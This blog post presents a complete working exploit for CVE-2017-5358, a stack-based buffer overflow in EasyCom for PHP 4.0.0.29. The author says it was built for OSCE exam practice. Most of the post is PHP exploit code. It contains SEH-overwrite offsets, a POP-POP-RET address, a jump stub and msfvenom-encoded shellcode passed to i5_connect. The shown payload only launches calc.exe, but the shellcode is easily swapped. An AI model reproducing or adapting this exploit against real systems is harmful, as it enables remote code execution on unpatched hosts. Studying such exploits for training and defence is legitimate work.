---
title: "EasyCom For PHP 4.0.0 - Buffer Overflow Exploit"
date: 2017-11-18 22:00:00
preview: "Stack-based buffer overflows in php_Easycom5_3_0.dll in EasyCom for PHP 4.0.0.29 allows remote attackers to execute arbitrary code via the server argument to the (1) i5_connect, (2) i5_pconnect, or (3) i5_private_connect API function."
---

John Page (*AKA Hyp3rlinX*) discovered a stack-based buffer overflows in EasyCom for PHP 4.0.0.29 (**CVE-2017-5358**). This security issue allows to a remote attacker to execute arbitrary code via the server argument to the API functions: `i5_connect`, `i5_pconnect`, or `i5_private_connect`. All this functions are implemented inside `php_Easycom5_3_0.dll`.

I tried to create a working exploit for fun and as my OSCE exam preparation.

## Environment
* EasycomPHP_4.0029.iC8im2.exe
* PHP 5.3.1 (cli) (built: Nov 20 2009 17:26:32)
* xampp-win32-1.7.3
* Windows XP SP2 32bit

## Exploit
```php
<?php

$nseh = "\xeb\x06\x90\x90";		# JMP ESP+6
$seh = "\x81\x04\x02\x10";		# POP POP RET - xampp\php\php5ts.dll

$jump_to_sc = "\x59\x59\x59";		# POP ECX ; POP ECX ; POP ECX
$jump_to_sc = $jump_to_sc . "\xfe\xcd"; # DEC CH
$jump_to_sc = $jump_to_sc . "\xfe\xcd"; # DEC CH
$jump_to_sc = $jump_to_sc . "\xfe\xcd"; # DEC CH
$jump_to_sc = $jump_to_sc . "\xff\xe1"; # JMP ECX

# msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/shikata_ga_nai -f c
# size: 220 bytes
$shellcode = "\xb8\xcd\x5a\x0b\x2d\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1";
$shellcode  = $shellcode . "\x31\x31\x43\x13\x03\x43\x13\x83\xc3\xc9\xb8\xfe\xd1\x39\xbe";
$shellcode  = $shellcode . "\x01\x2a\xb9\xdf\x88\xcf\x88\xdf\xef\x84\xba\xef\x64\xc8\x36";
$shellcode  = $shellcode . "\x9b\x29\xf9\xcd\xe9\xe5\x0e\x66\x47\xd0\x21\x77\xf4\x20\x23";
$shellcode  = $shellcode . "\xfb\x07\x75\x83\xc2\xc7\x88\xc2\x03\x35\x60\x96\xdc\x31\xd7";
$shellcode  = $shellcode . "\x07\x69\x0f\xe4\xac\x21\x81\x6c\x50\xf1\xa0\x5d\xc7\x8a\xfa";
$shellcode  = $shellcode . "\x7d\xe9\x5f\x77\x34\xf1\xbc\xb2\x8e\x8a\x76\x48\x11\x5b\x47";
$shellcode  = $shellcode . "\xb1\xbe\xa2\x68\x40\xbe\xe3\x4e\xbb\xb5\x1d\xad\x46\xce\xd9";
$shellcode  = $shellcode . "\xcc\x9c\x5b\xfa\x76\x56\xfb\x26\x87\xbb\x9a\xad\x8b\x70\xe8";
$shellcode  = $shellcode . "\xea\x8f\x87\x3d\x81\xab\x0c\xc0\x46\x3a\x56\xe7\x42\x67\x0c";
$shellcode  = $shellcode . "\x86\xd3\xcd\xe3\xb7\x04\xae\x5c\x12\x4e\x42\x88\x2f\x0d\x08";
$shellcode  = $shellcode . "\x4f\xbd\x2b\x7e\x4f\xbd\x33\x2e\x38\x8c\xb8\xa1\x3f\x11\x6b";
$shellcode  = $shellcode . "\x86\xb0\x5b\x36\xae\x58\x02\xa2\xf3\x04\xb5\x18\x37\x31\x36";
$shellcode  = $shellcode . "\xa9\xc7\xc6\x26\xd8\xc2\x83\xe0\x30\xbe\x9c\x84\x36\x6d\x9c";
$shellcode  = $shellcode . "\x8c\x54\xf0\x0e\x4c\xb5\x97\xb6\xf7\xc9";

# SEH overwrite      = 1868 bytes
# payload_base       = 00C0F864
# ecx		     = 00C0FCB0
# ecx - payload_base = 1100 bytes

$nop1 = str_repeat("\x90", 1100);
$nop2 = str_repeat("\x90", 1868 - strlen($nop1) - strlen($shellcode));
$nop3 = str_repeat("\x90", 1000);

$payload = $nop1 . $shellcode . $nop2 . $nseh . $seh . $jump_to_sc . $nop3;

$conn = i5_connect($payload, "QPGMR", "PASSW") or die(i5_errormsg());

?>

```

## References
* [hyp3rlinx](http://hyp3rlinx.altervista.org/advisories/EASYCOM-PHP-API-BUFFER-OVERFLOW.txt)
* [SEH exploitation tutorial](http://www.thegreycorner.com/2010/01/seh-stack-based-windows-buffer-overflow.html)
* [exploit-db PoC](https://www.exploit-db.com/exploits/41425/)

The author is not responsible for the misuse of the information provided in this advisory.